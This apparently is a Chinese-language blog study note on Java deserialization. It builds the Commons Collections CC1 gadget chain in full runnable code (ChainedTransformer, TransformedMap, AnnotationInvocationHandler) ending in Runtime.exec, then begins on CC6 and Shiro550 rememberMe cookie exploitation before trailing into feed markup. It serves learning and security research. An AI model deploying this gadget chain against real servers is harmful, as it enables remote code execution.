<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //遍历Map的常用格式</span></span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            //通过setValue方法传入Runtime对象</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        unserialize(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后发现并没有弹计算器，我们打开序列化后的数据，发现找不到最重要的Runtime类</p>
<img src="/image/image-20230809001632001.png" alt="image-20230809001632001" style="zoom:80%;" />

<p>跟进到Runtime类，发现并没有实现序列化接口，因此不能被序列化</p>
<img src="/image/image-20230809002128957.png" alt="image-20230809002128957" style="zoom:80%;" />

<p>但是原型类实现了序列化接口，我们可以通过获取Runtime的原型类进行反射</p>
<img src="/image/image-20230809003308828.png" alt="image-20230809003308828" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们之前提到过invokerTransformr类的transform方法可以代替反射操作，我们用transform改写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用transform方法改写</span></span><br><span class="line"><span class="comment">//获取getRuntime方法,首先获取Class原型类的getDeclaredMethod方法，然后定义传入参数类型，最后传入两个参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getDeclaredMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;</span><br><span class="line">).transform(rt);</span><br><span class="line"><span class="comment">//获取Runtime对象,首先获取invoke方法，定义参数类型，最后两个null</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;</span><br><span class="line">).transform(getRuntime);</span><br><span class="line"><span class="comment">//反射执行exec方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">).transform(runtime);</span><br></pre></td></tr></table></figure>

<p>可以看到一共嵌套了三层，我们直接使用cc库中自带的链式transformer类ChainedTransformer</p>
<img src="/image/image-20230810204718705.png" alt="image-20230810204718705" style="zoom:80%;" />

<p>我们使用ChainedTransformer进行改写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用ChainedTransformer改写</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(rt);</span><br></pre></td></tr></table></figure>

<p>自此我们实现了通过Runtime原型类反射执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="comment">//Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        //普通反射</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = rt.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null,null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = rt.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//用transform方法改写</span></span><br><span class="line">        <span class="comment">//获取getRuntime方法,首先获取Class原型类的getDeclaredMethod方法，然后定义传入参数类型，最后传入两个参数</span></span><br><span class="line"><span class="comment">//        Method getRuntime = (Method) new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;getDeclaredMethod&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class,Class[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;&quot;getRuntime&quot;,null&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(rt);</span></span><br><span class="line"><span class="comment">//        //获取Runtime对象,首先获取invoke方法，定义参数类型，最后两个null</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;invoke&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;Object.class,Object[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;null,null&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(getRuntime);</span></span><br><span class="line"><span class="comment">//        //反射执行exec方法</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;&quot;calc&quot;&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(runtime);</span></span><br><span class="line">        <span class="comment">//用ChainedTransformer改写</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(rt);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //遍历Map的常用格式</span></span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            //通过setValue方法传入Runtime对象</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        unserialize(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在回到触发点readObject处</p>
<img src="/image/image-20230810211759713.png" alt="image-20230810211759713" style="zoom:80%;" />

<p>观察了一下，发现我们要利用的setValue方法包括在第二层if语句内，因此我们需要同时满足这两个if条件，直接在第一个if处下断点运行</p>
<img src="/image/image-20230810212146341.png" alt="image-20230810212146341" style="zoom:80%;" />

<p>由于idea反编译，代码出现了变动，可以无视，此处变量var7即为memberType且值为null，直接跳出了语句</p>
<p>我们来看看memberType是什么</p>
<img src="/image/image-20230810213642227.png" alt="image-20230810213642227" style="zoom:80%;" />

<p>从名字我们可以看出，这个是用来处理注解中成员变量的，而我们此时使用的注解是Override</p>
<img src="/image/image-20230810214553833.png" alt="image-20230810214553833" style="zoom:80%;" />

<img src="/image/image-20230810214427736.png" alt="image-20230810214427736" style="zoom:80%;" />

<p>其中并没有成员变量，我们找一个其他的，例如Target注解中，存在一个value成员变量</p>
<img src="/image/image-20230810214706473.png" alt="image-20230810214706473" style="zoom:80%;" />

<p>我们可以使用Target注解，并且推一个键名为value的键值对</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">......</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230810215316588.png" alt="image-20230810215316588" style="zoom:80%;" />

<p>现在var7即memberType的值不为空，满足第一个if</p>
<img src="/image/image-20230810215557521.png" alt="image-20230810215557521" style="zoom:80%;" />

<p>第二个if也满足，成功达到setValue方法，继续跟进</p>
<img src="/image/image-20230810220855360.png" alt="image-20230810220855360" style="zoom:80%;" />

<p>我们发现传入的value并不是需要的Runtime类，而是AnnotationTypeMismatchExceptionProxy，回到第二个if语句，我们可以看到setValue方法直接接受的是<code>new AnnotationTypeMismatchExceptionProxy()</code>语句所实例化的对象，因此无法找到getDeclaredMethod方法</p>
<img src="/image/image-20230810221329726.png" alt="image-20230810221329726" style="zoom:80%;" />

<p>因此我们需要转换这里传入的value值，跟进checkSetValue方法发现是TransformedMap类</p>
<img src="/image/image-20230810223251125.png" alt="image-20230810223251125" style="zoom:80%;" />

<p>我们首先观察一下链式transform的流程，通过下标递增依次执行</p>
<p>可以看到这里执行的是valueTransformer的transform方法，这一条ChainedTransformer链一共有三个Transformer，我们跟进到ChainedTransformer的transform方法，当下标为0时传入对象为AnnotationTypeMismatchExceptionProxy，找不到getDeclaredMethod直接报错</p>
<img src="/image/image-20230810224606744.png" alt="image-20230810224606744" style="zoom:80%;" />

<p>我们要如何转换这里接收到的对象类型呢，这里我们要用到的是cc库中的ConstantTransformer类，它的作用是转换返回的常量类型</p>
<img src="/image/image-20230810225431257.png" alt="image-20230810225431257" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用ConstantTransformer指定返回类型后的链式Transformer</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>继续运行跟进到chainedTransformer，当下标为0时执行ConstantTransformer的transform方法</p>
<img src="/image/image-20230810230802930.png" alt="image-20230810230802930" style="zoom:80%;" />

<p>此时将对象转换为了Runtime类并返回</p>
<img src="/image/image-20230810232833074.png" alt="image-20230810232833074" style="zoom:80%;" />

<p>成功达到终点，并进入Runtime类</p>
<p>整个调用链如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	AnnotationInvocationHandler.readObject()</span><br><span class="line">        Map(Proxy).entrySet()</span><br><span class="line">            AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                TransformedMap.decorate()</span><br><span class="line">                TransformedMap.checkSetValue()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getDeclaredMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>



<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">JDK版本：jdk8u71</span><br><span class="line">组件版本：commons-collections-3.2.1</span><br></pre></td></tr></table></figure>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>在JDK-8u71版本之后，cc-1的关键漏洞点AnnotationInvocationHandler.java的readObject方法做出了一下修改</p>
<h3 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>在Apache shiro的框架中，执行身份验证时提供了一个记住密码的功能（RememberMe），如果用户登录时勾选了这个选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。加密的过程是：<strong>用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（这一步需要用密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段</strong>。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。那么显然，服务端进行对cookie进行验证的步骤就是：<strong>取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（用到密钥key）&#x3D;&gt;反序列化。</strong></p>
<p>首先进行登录，勾选RememberMe选项</p>
<img src="/image/image-20230911103438064.png" alt="image-20230911103438064" style="zoom:80%;" />

<p>返回cookie字段钟存在rememberMe字段</p>
<p>或者直接携带任意rememberMe字段进行发包，相应包中存在deleteMe字段</p>
<img src="/image/image-20230912171705451.png" alt="image-20230912171705451" style="zoom:80%;" />

<p>当客户端再次请求服务端时，都会带上这个服务端第一次返回设置的Set-Cookie里面的rememberMe的密文，让服务端进行身份验证。</p>
<p>整个正常流程和攻击流程参照下图</p>
<img src="/image/image-20230912171915619.png" alt="image-20230912171915619" style="zoom: 67%;" />

<p>可以看到触发点是cookie处理的部分，shiro默认使用CookieRememberMeManager类处理cookie</p>
<p>我们跟进到<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类</p>
<img src="/image/image-20230912182438895.png" alt="image-20230912182438895" style="zoom:80%;" />

<p><code>CookieRememberMeManager</code>类总共有四个涉及cookie处理的函数：<code>CookieRememberMeManager</code>， <code>rememberSerializedIdentity</code> ，<code>getRememberedSerializedIdentity</code>及<code>forgetIdentity</code>（公有，私有，保护），我们依次来看</p>
<h5 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h5><img src="/image/image-20230912183247709.png" alt="image-20230912183247709" style="zoom: 80%;" />

<p>构造方法，作用是设置一个cookie对象，并且设置HttpOnly和MaxAge，跟进到SimpleCookie类</p>
<img src="/image/image-20230912184029090.png" alt="image-20230912184029090" style="zoom:80%;" />

<p>设置了</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>护网面试问题</title>
    <url>/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/</url>
